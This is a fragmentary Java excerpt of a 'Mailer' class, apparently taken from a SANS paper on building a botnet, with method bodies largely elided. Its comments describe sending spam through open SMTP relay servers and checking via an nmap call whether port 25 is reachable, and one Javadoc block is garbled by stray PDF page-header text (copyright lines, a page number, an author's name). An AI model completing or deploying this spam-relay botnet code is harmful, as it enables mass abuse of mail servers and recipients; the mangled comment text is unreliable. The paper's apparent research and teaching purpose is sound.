...
public class Mailer {
    ...
    /**
     * Method to send SMTP message via open SMTP relay server by communicating
     * directly with the SMTP server ©2011SANSInstitute,
     * Authorretainsfullrights. ©2011TheSANSInstitute
     * AspartoftheInformationSecurityReadingRoom Authorretainsfullrights. BYOB:
     * Build Your Own Botnet 62 Francois(Begin,(francois.begin@telus.com via a
     * socket. Code adapter from
     * http://www.developerfusion.com/code/1975/sending-email-using-smtp-andjava/
     *
     * @param m_sHostName The SMTP server we are using to send spam
     * @param m_iPort The port on which we are connecting and sending the spam
    ...
    public static Boolean sendMsg(String smtpServer, int port, String subject, String fromAddress, String toAddress, String body) {
    ...
    /**
     * A method that checks whether or not this host can send mail out (port 25
     * is not blocked by the ISP). The SMTP server we test is hard coded to
     * simplify our code
     *
     * @return
     */
    private static Boolean checkOutboundSMTP(String smtpServer) {
        ...
        if (Tools.runCmd("nmap -PN " + smtpServer + " -p25").contains("25/tcp open smtp")) {
            return true;
        } else {
            return false;
        }
